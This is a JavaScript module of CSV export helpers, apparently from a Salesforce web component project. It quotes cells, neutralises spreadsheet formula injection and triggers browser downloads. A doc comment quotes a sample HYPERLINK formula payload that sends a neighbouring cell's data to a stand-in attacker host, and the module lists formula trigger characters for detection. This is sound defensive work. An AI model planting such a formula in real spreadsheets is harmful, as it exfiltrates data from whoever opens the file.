/**
 * Shared CSV → local file download used by the event page and the Approved Exports tab.
 *
 * Two things here are not incidental:
 *  - the UTF-8 BOM, without which desktop Excel reads the file as the local ANSI
 *    codepage and mangles every non-ASCII name;
 *  - the deferred revokeObjectURL, because revoking in the same tick as click()
 *    cancels the download in Safari and older Chrome.
 */
const UTF8_BOM = '\uFEFF';

/**
 * Leading characters Excel and LibreOffice evaluate as the start of a formula.
 * Tab and CR are included because Excel skips them before parsing what follows.
 */
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Quote a value for CSV and neutralise formula injection.
 *
 * This used to be one of a matched pair, mirroring EventExportController.csvCell.
 * That class went when the approved-invitee export became a standard report, and
 * the standard report exporter does no such guarding — so this is now the only
 * sanitised download in the project, covering the import wizard's manual-review
 * list. Fewer places to keep in step, but also less covered ground.
 *
 * A cell opening with =, +, - or @ is executed when the file is opened, so
 * `=HYPERLINK("http://evil/?d="&A1,"Invoice")` in an imported contact name
 * exfiltrates the neighbouring row on one click. The apostrophe forces the
 * spreadsheet to read the value as text.
 */
export function csvCell(value) {
    if (value === null || value === undefined) return '';
    const text = String(value);
    const guarded = text.length > 0 && FORMULA_TRIGGERS.includes(text.charAt(0));
    const safe = guarded ? `'${text}` : text;
    if (guarded || /[",\n\r]/.test(safe)) {
        return `"${safe.replace(/"/g, '""')}"`;
    }
    return safe;
}

/** One CSV line from an array of raw values. */
export function csvRow(cells) {
    return cells.map(csvCell).join(',');
}

export function downloadCsv(csv, fileName) {
    const blob = new Blob([UTF8_BOM + csv], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement('a');
    anchor.href = url;
    anchor.download = fileName || 'export.csv';
    anchor.style.display = 'none';
    // Firefox only fires the download for an anchor that is in the document.
    document.body.appendChild(anchor);
    anchor.click();
    // The deferral is the point: revoking in the same tick as click() cancels the
    // download in Safari and older Chrome. Not the render-timing hack the rule
    // exists to catch.
    // eslint-disable-next-line @lwc/lwc/no-async-operation
    setTimeout(() => {
        document.body.removeChild(anchor);
        URL.revokeObjectURL(url);
    }, 0);
}
